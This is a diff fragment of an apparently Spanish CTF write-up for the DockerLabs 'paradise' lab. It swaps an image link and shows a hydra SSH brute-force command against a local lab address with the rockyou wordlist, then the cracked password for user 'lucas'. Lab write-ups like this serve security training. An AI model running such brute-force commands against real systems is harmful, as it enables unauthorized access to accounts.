@@ -29,7 +29,7 @@ Lanzamos un ataque de fuerza bruta ya que nos indican que la contraseña es déb
 
 > hydra -l lucas -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 
-![[dockerlabs/facil/paradise/test5.png]]
+![image](https://github.com/user-attachments/assets/19976a30-0ace-4715-8afc-29c6b38cc370)
 
 nos da la contraseña de lucas: chocolate
 
